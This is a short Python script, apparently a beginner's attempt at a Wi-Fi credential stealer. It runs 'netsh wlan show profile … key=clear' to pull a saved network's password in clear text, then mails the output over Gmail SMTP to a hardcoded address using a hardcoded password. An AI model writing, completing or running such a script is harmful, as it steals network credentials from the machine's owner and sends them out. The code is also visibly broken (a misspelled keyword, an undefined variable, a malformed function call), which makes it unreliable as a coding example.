#!/usr/bin/env python

import subprocess, smtplib, re


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.Gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


command = "netsh wlan show profile UPC723762 key=clear"
networks = subprocess.check_output(command, shall=True)
network_names = re.findall("(?:Profile\s*:\s)(.*)", networks)
print(network_names.group)


send_mail("BobPage12@gmail.com, abc123abc12", result)